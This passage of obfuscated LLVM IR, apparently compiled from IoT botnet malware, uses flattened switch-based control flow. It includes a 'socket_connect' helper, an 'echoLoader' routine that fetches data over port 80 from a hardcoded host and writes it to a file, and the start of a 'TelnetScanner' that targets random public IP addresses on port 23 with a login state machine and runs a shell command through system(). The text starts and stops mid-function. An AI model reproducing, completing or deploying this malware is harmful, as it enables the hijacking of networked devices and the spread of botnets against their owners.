; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %.reg2mem = alloca %struct.hostent*
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca %struct.hostent*, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  store i32 1, i32* %7, align 4
  %9 = load i8*, i8** %3, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %5, align 8
  %switchVar = alloca i32
  store i32 832235676, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 832235676, label %first
    i32 -1036585691, label %13
    i32 -755865015, label %14
    i32 1736440932, label %37
    i32 1223994772, label %38
    i32 750965747, label %44
    i32 -1591623564, label %45
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %11 = icmp eq %struct.hostent* %.reload, null
  %12 = select i1 %11, i32 -1036585691, i32 -755865015
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.47, i32 0, i32 0)) #2
  call void @exit(i32 1) #14
  unreachable

; <label>:14:                                     ; preds = %loopEntry
  %15 = load %struct.hostent*, %struct.hostent** %5, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %5, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #2
  %26 = load i16, i16* %4, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %30, i32* %8, align 4
  %31 = load i32, i32* %8, align 4
  %32 = bitcast i32* %7 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #2
  %34 = load i32, i32* %8, align 4
  %35 = icmp eq i32 %34, -1
  %36 = select i1 %35, i32 1736440932, i32 1223994772
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.48, i32 0, i32 0))
  call void @exit(i32 1) #14
  unreachable

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %8, align 4
  %40 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %41 = call i32 @connect(i32 %39, %struct.sockaddr* %40, i32 16)
  %42 = icmp eq i32 %41, -1
  %43 = select i1 %42, i32 750965747, i32 -1591623564
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.49, i32 0, i32 0))
  call void @exit(i32 1) #14
  unreachable

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %8, align 4
  ret i32 %46

loopEnd:                                          ; preds = %38, %14, %first, %switchDefault
  br label %loopEntry
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @herror(i8*) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

declare void @perror(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @echoLoader() #0 {
  %1 = alloca [512 x i8], align 16
  %2 = alloca i32, align 4
  %3 = alloca %struct._IO_FILE*, align 8
  %4 = call i32 @socket_connect(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.50, i32 0, i32 0), i16 zeroext 80)
  store i32 %4, i32* %2, align 4
  %5 = load i32, i32* %2, align 4
  %6 = call i64 @write(i32 %5, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.51, i32 0, i32 0), i64 13)
  %7 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %7, i8 0, i64 512, i32 16, i1 false)
  %switchVar = alloca i32
  store i32 -2080078669, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2080078669, label %8
    i32 -336808920, label %14
    i32 725187848, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %2, align 4
  %10 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  %11 = call i64 @read(i32 %9, i8* %10, i64 511)
  %12 = icmp ne i64 %11, 0
  %13 = select i1 %12, i32 -336808920, i32 725187848
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0))
  store %struct._IO_FILE* %15, %struct._IO_FILE** %3, align 8
  %16 = load %struct._IO_FILE*, %struct._IO_FILE** %3, align 8
  %17 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  %18 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %16, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.54, i32 0, i32 0), i8* %17)
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** %3, align 8
  %20 = call i32 @fclose(%struct._IO_FILE* %19)
  %21 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 512, i32 16, i1 false)
  store i32 -2080078669, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %2, align 4
  %24 = call i32 @shutdown(i32 %23, i32 2) #2
  %25 = load i32, i32* %2, align 4
  %26 = call i32 @close(i32 %25)
  ret void

loopEnd:                                          ; preds = %14, %8, %switchDefault
  br label %loopEntry
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #3

declare i32 @fclose(%struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @shutdown(i32, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner() #0 {
  %.reg2mem405 = alloca i32
  %.reg2mem26 = alloca %struct.telstate_t*
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 818960421, i32* %switchVar
  %.reg2mem420 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar25 = load i32, i32* %switchVar
  switch i32 %switchVar25, label %switchDefault [
    i32 818960421, label %first
    i32 -1022819779, label %20
    i32 -300875227, label %21
    i32 284821357, label %23
    i32 -1599497146, label %37
    i32 -346810098, label %42
    i32 -1156791222, label %57
    i32 -1950096705, label %60
    i32 850416488, label %64
    i32 -1098750352, label %65
    i32 678181630, label %66
    i32 -1503737136, label %71
    i32 -1381705386, label %NodeBlock23
    i32 574278226, label %NodeBlock21
    i32 226092386, label %NodeBlock19
    i32 -1810605319, label %NodeBlock17
    i32 -761842236, label %LeafBlock15
    i32 1134506756, label %NodeBlock13
    i32 -1937344938, label %NodeBlock11
    i32 -1187633719, label %NodeBlock9
    i32 1222353475, label %NodeBlock7
    i32 985409572, label %NodeBlock5
    i32 -1767415552, label %NodeBlock3
    i32 1692234784, label %NodeBlock1
    i32 771493274, label %NodeBlock
    i32 636337282, label %LeafBlock
    i32 2120770137, label %92
    i32 465595080, label %105
    i32 -363843117, label %125
    i32 104427638, label %140
    i32 -766328245, label %151
    i32 1405687031, label %160
    i32 522595873, label %165
    i32 850998052, label %166
    i32 155573021, label %205
    i32 -1268457325, label %206
    i32 1443103259, label %229
    i32 1840295065, label %234
    i32 -2026666440, label %245
    i32 -1607699657, label %254
    i32 -695694808, label %255
    i32 -1532465167, label %263
    i32 -833015210, label %270
    i32 -176663025, label %271
    i32 -1096563910, label %280
    i32 793935853, label %281
    i32 -1404957478, label %313
    i32 -1688531010, label %324
    i32 -1976305536, label %339
    i32 116729086, label %370
    i32 -302314883, label %371
    i32 1326883952, label %375
    i32 -998772303, label %390
    i32 697978820, label %391
    i32 -1773859900, label %402
    i32 1290858659, label %417
    i32 439100880, label %418
    i32 -2052224924, label %426
    i32 -846079691, label %433
    i32 -471767697, label %453
    i32 -1527319014, label %470
    i32 -1398479696, label %475
    i32 247331024, label %481
    i32 2022870444, label %486
    i32 399446786, label %506
    i32 795019095, label %523
    i32 -1887703515, label %528
    i32 1842975591, label %534
    i32 -1842583322, label %539
    i32 -466763244, label %559
    i32 2103773866, label %576
    i32 -799026987, label %581
    i32 -902863604, label %587
    i32 -292905141, label %592
    i32 -1161289985, label %612
    i32 51205623, label %629
    i32 2124748698, label %634
    i32 350853082, label %640
    i32 1673111712, label %645
    i32 -1138158094, label %665
    i32 899629215, label %682
    i32 1192251807, label %687
    i32 1153686782, label %693
    i32 624689209, label %698
    i32 -1323941909, label %710
    i32 229830336, label %711
    i32 -112986746, label %712
    i32 1869441271, label %713
    i32 -1694989014, label %714
    i32 1593440785, label %725
    i32 -137540645, label %740
    i32 435534613, label %741
    i32 2129087009, label %767
    i32 9968878, label %782
    i32 -1053843084, label %791
    i32 -259676276, label %806
    i32 161212673, label %811
    i32 1599564283, label %819
    i32 85093915, label %826
    i32 1068537333, label %846
    i32 2066269078, label %863
    i32 -2041809177, label %868
    i32 -1672235888, label %873
    i32 734474005, label %879
    i32 -411445407, label %899
    i32 -930754493, label %916
    i32 -1554863868, label %921
    i32 2008045643, label %926
    i32 1454474510, label %932
    i32 320516803, label %941
    i32 1287666271, label %956
    i32 1393891403, label %965
    i32 -765212361, label %980
    i32 -323724753, label %989
    i32 2045847866, label %1004
    i32 758617630, label %1013
    i32 924392342, label %1028
    i32 1281586438, label %1037
    i32 -1969233801, label %1052
    i32 419578374, label %1061
    i32 -291159724, label %1076
    i32 -1338295844, label %1085
    i32 46139568, label %1100
    i32 333499587, label %1109
    i32 1354000359, label %1124
    i32 1492503634, label %1133
    i32 -1624474035, label %1148
    i32 696163375, label %1160
    i32 1122747494, label %1171
    i32 -1345848622, label %1186
    i32 -193359245, label %1187
    i32 -47844031, label %1213
    i32 1776159521, label %1228
    i32 534600445, label %1237
    i32 -943112738, label %1252
    i32 293782638, label %1257
    i32 -1933830239, label %1265
    i32 19231790, label %1272
    i32 1702816913, label %1292
    i32 1209875802, label %1309
    i32 -1336745509, label %1329
    i32 -1598447686, label %1338
    i32 -1112505390, label %1358
    i32 -57133709, label %1363
    i32 -1497267999, label %1369
    i32 2102333845, label %1389
    i32 -1285530381, label %1406
    i32 591968256, label %1426
    i32 1261075385, label %1435
    i32 -86078205, label %1455
    i32 -973307164, label %1460
    i32 -1809425599, label %1466
    i32 303649959, label %1486
    i32 -1391678109, label %1503
    i32 -1632501356, label %1523
    i32 1138596044, label %1528
    i32 -273640164, label %1534
    i32 -747233227, label %1554
    i32 542643682, label %1571
    i32 -960611284, label %1591
    i32 -612666132, label %1596
    i32 -1013795793, label %1602
    i32 -565186089, label %1622
    i32 -1439678041, label %1639
    i32 1948172069, label %1659
    i32 1087488077, label %1664
    i32 -52534665, label %1670
    i32 2126149479, label %1690
    i32 1969755946, label %1707
    i32 -377429414, label %1727
    i32 -1791654516, label %1732
    i32 -642070141, label %1738
    i32 413542978, label %1758
    i32 1944280129, label %1775
    i32 -1274926941, label %1795
    i32 45194861, label %1800
    i32 -2065938082, label %1806
    i32 -1500919049, label %1826
    i32 1762011072, label %1843
    i32 178495681, label %1863
    i32 579562244, label %1868
    i32 1972843708, label %1874
    i32 -688004439, label %1894
    i32 558518064, label %1911
    i32 1202913675, label %1931
    i32 -1540120301, label %1936
    i32 -925380061, label %1942
    i32 -974629979, label %1954
    i32 1784333176, label %1965
    i32 -1912568534, label %1980
    i32 -1774111113, label %1981
    i32 1977211686, label %1990
    i32 -1680623417, label %2005
    i32 -2034946602, label %2010
    i32 2069855383, label %2019
    i32 -1518100655, label %2034
    i32 -694585448, label %2039
    i32 745414734, label %2048
    i32 103036608, label %2063
    i32 2025059761, label %2094
    i32 -733313760, label %2105
    i32 1566444569, label %2114
    i32 -1448487328, label %2129
    i32 1527286222, label %2134
    i32 1241434121, label %2142
    i32 174263979, label %2149
    i32 -62236947, label %2169
    i32 1667530195, label %2210
    i32 1644025112, label %2230
    i32 1657188774, label %2271
    i32 -1435616820, label %2291
    i32 297863548, label %2351
    i32 1221485587, label %2363
    i32 1003822257, label %2364
    i32 1674863284, label %2365
    i32 202933550, label %2376
    i32 -784850618, label %2391
    i32 -1494388807, label %NewDefault
    i32 1068643273, label %2392
    i32 -1653477229, label %2393
    i32 -251113429, label %2396
    i32 -940258647, label %2397
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp sgt i32 %.reload, 512
  %19 = select i1 %18, i32 -1022819779, i32 -300875227
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  store i32 284821357, i32* %switchVar
  store i32 512, i32* %.reg2mem420
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i32, i32* %1, align 4
  store i32 284821357, i32* %switchVar
  store i32 %22, i32* %.reg2mem420
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %.reload421 = load i32, i32* %.reg2mem420
  store i32 %.reload421, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 23) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  store %struct.telstate_t* %32, %struct.telstate_t** %.reg2mem26
  %.reload404 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %33 = bitcast %struct.telstate_t* %.reload404 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  store i32 -1599497146, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  %41 = select i1 %40, i32 -346810098, i32 -1950096705
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %2, align 4
  %44 = sext i32 %43 to i64
  %.reload403 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload403, i64 %44
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i32 0, i32 3
  store i8 1, i8* %46, align 1
  %47 = call noalias i8* @malloc(i64 1024) #2
  %48 = load i32, i32* %2, align 4
  %49 = sext i32 %48 to i64
  %.reload402 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload402, i64 %49
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i32 0, i32 8
  store i8* %47, i8** %51, align 8
  %52 = load i32, i32* %2, align 4
  %53 = sext i32 %52 to i64
  %.reload401 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload401, i64 %53
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %54, i32 0, i32 8
  %56 = load i8*, i8** %55, align 8
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1156791222, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %2, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %2, align 4
  store i32 -1599497146, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = call i32 @system(i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.55, i32 0, i32 0))
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 5, i64* %62, align 8
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %63, align 8
  store i32 850416488, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 -1098750352, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 678181630, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %2, align 4
  %68 = load i32, i32* %1, align 4
  %69 = icmp slt i32 %67, %68
  %70 = select i1 %69, i32 -1503737136, i32 -251113429
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %2, align 4
  %73 = sext i32 %72 to i64
  %.reload400 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload400, i64 %73
  %75 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i32 0, i32 2
  %76 = load i8, i8* %75, align 8
  %77 = zext i8 %76 to i32
  store i32 %77, i32* %.reg2mem405
  store i32 -1381705386, i32* %switchVar
  br label %loopEnd

NodeBlock23:                                      ; preds = %loopEntry
  %.reload419 = load volatile i32, i32* %.reg2mem405
  %Pivot24 = icmp slt i32 %.reload419, 6
  %78 = select i1 %Pivot24, i32 1222353475, i32 574278226
  store i32 %78, i32* %switchVar
  br label %loopEnd

NodeBlock21:                                      ; preds = %loopEntry
  %.reload412 = load volatile i32, i32* %.reg2mem405
  %Pivot22 = icmp slt i32 %.reload412, 9
  %79 = select i1 %Pivot22, i32 -1937344938, i32 226092386
  store i32 %79, i32* %switchVar
  br label %loopEnd

NodeBlock19:                                      ; preds = %loopEntry
  %.reload409 = load volatile i32, i32* %.reg2mem405
  %Pivot20 = icmp slt i32 %.reload409, 11
  %80 = select i1 %Pivot20, i32 1134506756, i32 -1810605319
  store i32 %80, i32* %switchVar
  br label %loopEnd

NodeBlock17:                                      ; preds = %loopEntry
  %.reload407 = load volatile i32, i32* %.reg2mem405
  %Pivot18 = icmp slt i32 %.reload407, 12
  %81 = select i1 %Pivot18, i32 -733313760, i32 -761842236
  store i32 %81, i32* %switchVar
  br label %loopEnd

LeafBlock15:                                      ; preds = %loopEntry
  %.reload406 = load volatile i32, i32* %.reg2mem405
  %SwitchLeaf16 = icmp eq i32 %.reload406, 12
  %82 = select i1 %SwitchLeaf16, i32 1527286222, i32 -1494388807
  store i32 %82, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload408 = load volatile i32, i32* %.reg2mem405
  %Pivot14 = icmp slt i32 %.reload408, 10
  %83 = select i1 %Pivot14, i32 -694585448, i32 2025059761
  store i32 %83, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload411 = load volatile i32, i32* %.reg2mem405
  %Pivot12 = icmp slt i32 %.reload411, 7
  %84 = select i1 %Pivot12, i32 293782638, i32 -1187633719
  store i32 %84, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload410 = load volatile i32, i32* %.reg2mem405
  %Pivot10 = icmp slt i32 %.reload410, 8
  %85 = select i1 %Pivot10, i32 -1774111113, i32 -2034946602
  store i32 %85, i32* %switchVar
  br label %loopEnd

NodeBlock7:                                       ; preds = %loopEntry
  %.reload418 = load volatile i32, i32* %.reg2mem405
  %Pivot8 = icmp slt i32 %.reload418, 3
  %86 = select i1 %Pivot8, i32 1692234784, i32 985409572
  store i32 %86, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload414 = load volatile i32, i32* %.reg2mem405
  %Pivot6 = icmp slt i32 %.reload414, 4
  %87 = select i1 %Pivot6, i32 435534613, i32 -1767415552
  store i32 %87, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload413 = load volatile i32, i32* %.reg2mem405
  %Pivot4 = icmp slt i32 %.reload413, 5
  %88 = select i1 %Pivot4, i32 161212673, i32 -193359245
  store i32 %88, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload417 = load volatile i32, i32* %.reg2mem405
  %Pivot2 = icmp slt i32 %.reload417, 1
  %89 = select i1 %Pivot2, i32 636337282, i32 771493274
  store i32 %89, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload415 = load volatile i32, i32* %.reg2mem405
  %Pivot = icmp slt i32 %.reload415, 2
  %90 = select i1 %Pivot, i32 -695694808, i32 439100880
  store i32 %90, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload416 = load volatile i32, i32* %.reg2mem405
  %SwitchLeaf = icmp eq i32 %.reload416, 0
  %91 = select i1 %SwitchLeaf, i32 2120770137, i32 -1494388807
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i32, i32* %2, align 4
  %94 = sext i32 %93 to i64
  %.reload399 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload399, i64 %94
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %95, i32 0, i32 8
  %97 = load i8*, i8** %96, align 8
  call void @llvm.memset.p0i8.i64(i8* %97, i8 0, i64 1024, i32 1, i1 false)
  %98 = load i32, i32* %2, align 4
  %99 = sext i32 %98 to i64
  %.reload398 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload398, i64 %99
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %100, i32 0, i32 3
  %102 = load i8, i8* %101, align 1
  %103 = icmp ne i8 %102, 0
  %104 = select i1 %103, i32 465595080, i32 -363843117
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %2, align 4
  %107 = sext i32 %106 to i64
  %.reload397 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload397, i64 %107
  %109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %108, i32 0, i32 8
  %110 = load i8*, i8** %109, align 8
  store i8* %110, i8** %11, align 8
  %111 = load i32, i32* %2, align 4
  %112 = sext i32 %111 to i64
  %.reload396 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload396, i64 %112
  %114 = bitcast %struct.telstate_t* %113 to i8*
  call void @llvm.memset.p0i8.i64(i8* %114, i8 0, i64 32, i32 16, i1 false)
  %115 = load i8*, i8** %11, align 8
  %116 = load i32, i32* %2, align 4
  %117 = sext i32 %116 to i64
  %.reload395 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload395, i64 %117
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %118, i32 0, i32 8
  store i8* %115, i8** %119, align 8
  %120 = call i32 @getRandomPublicIP()
  %121 = load i32, i32* %2, align 4
  %122 = sext i32 %121 to i64
  %.reload394 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload394, i64 %122
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %123, i32 0, i32 1
  store i32 %120, i32* %124, align 4
  store i32 850998052, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i32, i32* %2, align 4
  %127 = sext i32 %126 to i64
  %.reload393 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload393, i64 %127
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %128, i32 0, i32 5
  %130 = load i8, i8* %129, align 1
  %131 = add i8 %130, 1
  store i8 %131, i8* %129, align 1
  %132 = load i32, i32* %2, align 4
  %133 = sext i32 %132 to i64
  %.reload392 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload392, i64 %133
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %134, i32 0, i32 5
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i64
  %138 = icmp eq i64 %137, 13
  %139 = select i1 %138, i32 104427638, i32 -766328245
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i32, i32* %2, align 4
  %142 = sext i32 %141 to i64
  %.reload391 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload391, i64 %142
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %143, i32 0, i32 5
  store i8 0, i8* %144, align 1
  %145 = load i32, i32* %2, align 4
  %146 = sext i32 %145 to i64
  %.reload390 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload390, i64 %146
  %148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %147, i32 0, i32 4
  %149 = load i8, i8* %148, align 2
  %150 = add i8 %149, 1
  store i8 %150, i8* %148, align 2
  store i32 -766328245, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load i32, i32* %2, align 4
  %153 = sext i32 %152 to i64
  %.reload389 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload389, i64 %153
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %154, i32 0, i32 4
  %156 = load i8, i8* %155, align 2
  %157 = zext i8 %156 to i64
  %158 = icmp eq i64 %157, 4
  %159 = select i1 %158, i32 1405687031, i32 522595873
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = load i32, i32* %2, align 4
  %162 = sext i32 %161 to i64
  %.reload388 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
